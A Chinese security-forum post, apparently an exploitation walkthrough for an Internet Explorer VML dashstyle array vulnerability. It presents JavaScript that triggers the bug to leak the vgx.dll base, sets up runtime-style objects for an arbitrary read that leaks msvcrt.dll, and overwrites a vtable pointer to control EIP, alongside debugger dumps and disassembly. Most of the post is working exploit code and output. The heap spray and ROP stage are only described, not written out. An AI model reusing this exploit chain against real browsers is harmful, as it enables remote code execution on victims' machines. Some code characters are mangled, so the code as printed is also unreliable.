
![](https://bbs.kanxue.com/upload/attach/201409/611309_11oxfugqq42lekc.png)

## 内存布局如下：

```
0:005> dd /c 2 06d112d0

06d112d0 75f3e702 88000000

06d112d8 6c18482c 06d230e0

06d112e0 00000003 00000000

06d112e8 75f3e705 88000000

06d112f0 0000000b 0000000c

06d112f8 0000000d 0000000f

06d11300 75f3e738 88000000

06d11308 6c184964 06d230e0

06d11310 00000003 00000000
```

Red: `COALineDashStyle`

Green:`ORG`数组

Purple: `GetOALineDashStyleArray` 其中Red区域便是虚表指针

接下来触发漏洞，获取虚表地址，减去偏移，得到`vgx.dll`基址，代码如下：

```
var length_orig = vml1.dashstyle.array.length;

vml1.dashstyle.array.length = 0 – 1;

//alert(“tedjoy”);

var objAddress = vml1.dashstyle.array.item(0×6);

var baseAddres = objAddress – 0×84964;
```

但是紧接着发现，仅仅通过`vgx`很难构造出完整的`rop`，所以我们还需要实现任意地址读写，其实任意地址读就够了，泄漏出`msvcrt.dll`基址。

### 任意地址读写，泄露MSVCRT.DLL基址：

基本思路还是和前面的一样，只是用的对象有所不同，VUPEN’s blog 上提到`COARuntime Style`对象，该对象有几个方法如下：

其中`get_rotation()`方法，会调用`CVMLShape::GetRTSInfo()`，`GetRTSInfo()`再调用`CParserTag::GetRTSInfo()`函数申请`0xac`字节大小的空间（这里和VUPEN说的有点偏差，可能是他们笔误，`0xac`字节的内存并不是`COARuntime Style`对象），实际大小为`0xb0`，在第一次调用`get_marginLeft`时也会申请`0xac`字节内存。代码如下：

![](https://bbs.kanxue.com/upload/attach/201409/611309_0pjbb3iucurr0lp.png)

```
.text:00480969 ; __int32 __stdcall COARuntimeStyle::get_rotation()
.text:00480969                 mov     edi, edi
.text:0048096B                 push    ebp
.text:0048096C                 mov     ebp, esp
……

.text:004809BC                 call    CVMLShape::GetRTSInfo(void)
.text:004809C1                 cmp     eax, ebx
.text:004809C3                 jz      short loc_480A07

.text:00467B40 ; struct CRuntimeStyleInfo *__thiscall CVMLShape::GetRTSInfo()
.text:00467B40                 mov     edi, edi
.text:00467B42                 push    ebx
.text:00467B43                 mov     ebx, ecx
.text:00467B45                 call    CVMLShape::GetShapeView(void)
.text:00467B4A                 test    eax, eax
.text:00467B4C                 jz      short loc_467B80
.text:00467B4E                 cmp     dword ptr [eax+74h], 0
.text:00467B52                 jz      short loc_467B80
.text:00467B54                 mov     ecx, [eax+74h]
.text:00467B57                 mov     eax, [ecx]
.text:00467B59                 push    edi
.text:00467B5A                 call    dword ptr [eax+18h]
```

调用`CParserTag::GetRTSInfo()`，申请`0xAC`字节内存

重点是其中的`get_marginLeft()`方法，该方法在第一次被调用时如果没有事先申请`0xac`字节的内存空间就会自己申请，然后再读取`0xAC`字节内存块便宜`0×58`处的指针所指向的字符串（任意地制读），代码如下：

```
.text:004801DA ; __int32 __stdcall COARuntimeStyle::get_marginLeft()
.text:004801DA                 mov     edi, edi
.text:004801DC                 push    ebp
.text:004801DD                 mov     ebp, esp
.text:0048022C                 mov     ecx, esi        ; this
.text:0048022E                 jnz     short loc_48025E
.text:00480230                 call    CVMLShape::GetRTSInfo(void)；会判断是否申请0xAC字节内存，返回0xAC内存块的首地址
.text:00480235                 cmp     eax, ebx
.text:00480237                 jz      short loc_480255
.text:00480239                 mov     ecx, [eax+58h]；偏移0×58
.text:0048023C                 cmp     ecx, ebx
.text:0048023E                 jz      short loc_48024D
.text:00480240                 push    ecx             ; unsigned __int16 *
.text:00480241                 call    GelHost::OASysAllocString()；复制指针指向的字符串
```

```
struct CRuntimeStyleInfo *__thiscall CParserTag::GetRTSInfo(CParserTag *this){
CParserTag *v1; // edi@1
void *v2; // eax@2
v1 = this;
if ( !*((_DWORD *)this + 12) ){
v2 = operator new(0xACu);
if ( v2 ){
*((_BYTE *)v2 + 3) &= 0xFEu;
…… 
}
else{v2 = 0;}
*((_DWORD *)v1 + 0xC) = v2;
if ( !v2 )
return 0;
memset(v2, 0, 0xACu);
}
return (struct CRuntimeStyleInfo *)*((_DWORD *)v1 + 12);
}
```

所以可以通过精心构造`ORG`数组的大小来布局内存，使其效果如下图所示：

![](https://bbs.kanxue.com/upload/attach/201409/611309_563h29vb4ktbacv.png)

JS代码如下：

```
for (var i = 0; i < 0×400; i++) {
b[i] = document.getElementById(“rect” + i.toString())._vgRuntimeStyle;
}
for (var i=0; i<0×400; i++){
b[i].rotation;
if (i == 0×300) {
vml2.dashstyle = “1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 38 39 40 41 42 43 44″
}
}
```

内存布局如下：

```
0:005> dd  06b948e0

06b948e0 00000001 00000002 00000003 00000004
06b948f0 00000005 00000006 00000007 00000008
06b94900 00000009 0000000a 0000000b 0000000c
06b94910 0000000d 0000000e 0000000f 00000010
06b94920 00000011 00000012 00000013 00000014
06b94930 00000015 00000016 00000017 00000018
06b94940 00000019 0000001a 0000001b 0000001c
06b94950 0000001d 0000001e 0000001f 00000020
06b94960 00000021 00000022 00000023 00000024
06b94970 00000025 00000026 00000027 00000028
06b94980 00000029 0000002a 0000002b 0000002c
06b94990 1552cc54 8c000000 01400018 00000000
06b949a0 00000000 00000000 00000000 00000000
06b949b0 00000000 00000000 00000000 00000000
06b949c0 00000000 00000000 00000000 00000000
06b949d0 00000000 00000000 00000000 00000000
06b949e0 00000000 00000000 00000000 00000000
06b949f0 00000000 00000000 00000000 00000000
06b94a00 00000000 00000000 00000000 00000000
06b94a10 00000000 00000000 00000000 00000000
06b94a20 00000000 00000000 00000000 00000000
06b94a30 00000000 00000000 00000000 00000000
06b94a40 00000001 00000000 1552cc2f 8c000000
```

Red: `ORG`数组

Green: `0xb0`内存块，其中红色部分将保存字符串指针

所以我们现在只需要触发漏洞修改偏移`0×58`处的值就可以实现任意地址读写，泄露`MSVCRT.DLL`基址 :)

JS代码如下：

```
//memcpy address in import
var memAddress = baseAddres + 0×1014;
var length_orig_2 = vml2.dashstyle.array.length;
vml2.dashstyle.array.length = 0 – 1;
for (var i=0; i<0×400; i++){
b[i].marginLeft = “tedjoy”;
marginLeftAddress = vml2.dashstyle.array.item(0x2E+0×16);
if (marginLeftAddress > 0) {
vml2.dashstyle.array.item(0x2E+0×16) = memAddress;
//leak msvcrt.dll base address
var leak = b[i].marginLeft;
alert( parseInt( leak.charCodeAt(1).toString(16) + leak.charCodeAt(0).toString(16), 16 ).toString(16) );
vml2.dashstyle.array.item(0x2E+0×16) = marginLeftAddress;
vml2.dashstyle.array.length = length_orig;
break;
}
}
```

得到的`memcpy()`函数地址：

![](https://bbs.kanxue.com/upload/attach/201409/611309_2r7fasftwq17vzd.png)

### 控制EIP：

接下来就可以通过得到的`memcpy()`函数的地址得到`MSVCRT.DLL`的基址，然后构造`ROP`。

最后把之前的`GetOALineDashStyleArray`对象的虚表指针修改指向通过`heap spray`已经控制了的内存空间。

JS代码如下：

```
vml1.dashstyle.array.item(0×6) = 0x0c0c0c0c;
```

接下来就会稳定的在如下所示的地方`crash`（因为没有`heap spraying`）：

```
6addd9f2 6809040000      push    409h
6addd9f7 51              push    ecx
6addd9f8 8bce            mov     ecx,esi
6addd9fa e83e000000      call    jscript!IDispatchInvoke (6addda3d)
6addd9ff 8b16            mov     edx,dword ptr [esi]         ;edx=0x0c0c0c0c
6addda01 894510          mov     dword ptr [ebp+10h],eax
6addda04 8b4208          mov     eax, [edx+8] ds:0023:0c0c0c14=????????
6addda07 56              push    esi
6addda08 ffd0             call    eax
```

如果已经`heap spray`过，那就可以控制系统流程，执行`ROP`，绕过`DEP`执行任意代码

行文简陋，如有不对还望大神多多赐教！

注：本帖由看雪论坛志愿者`PEstone` 重新将附件整理排版，若和原文有出入，以原作者附件为准

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

上传的附件：

- [Advanced Exploitation Technology-Analyze.pdf](javascript:void(0);)
  （591.06kb，185次下载）
- [1.png](javascript:void(0);)
  （18.26kb，5次下载）
- [2.png](javascript:void(0);)
  （2.35kb，5次下载）
- [3.png](javascript:void(0);)
  （3.82kb，6次下载）
- [4.png](javascript:void(0);)
  （22.46kb，5次下载）
- [5.png](javascript:void(0);)
  （2.71kb，7次下载）
- [6.png](javascript:void(0);)
  （16.50kb，5次下载）
